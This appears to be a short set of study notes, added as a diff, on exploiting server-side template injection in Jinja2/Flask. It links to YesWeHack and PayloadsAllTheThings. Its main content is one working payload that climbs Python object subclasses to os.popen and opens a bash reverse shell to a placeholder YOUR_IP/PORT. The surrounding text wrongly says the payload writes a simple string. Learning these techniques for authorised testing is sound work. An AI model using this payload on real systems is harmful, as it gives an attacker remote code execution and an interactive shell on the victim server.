@@ -1,0 +1,10 @@
+https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+
+PAYLOAD OF ALL THINGS 
+https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
+## PYTHON
+### 1) Jinja2 -flask framework 
+exploitation: payload techniques using index positions
+To write a simple string, we can write this payload (note: index values may vary):
+
+{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'").read()}}
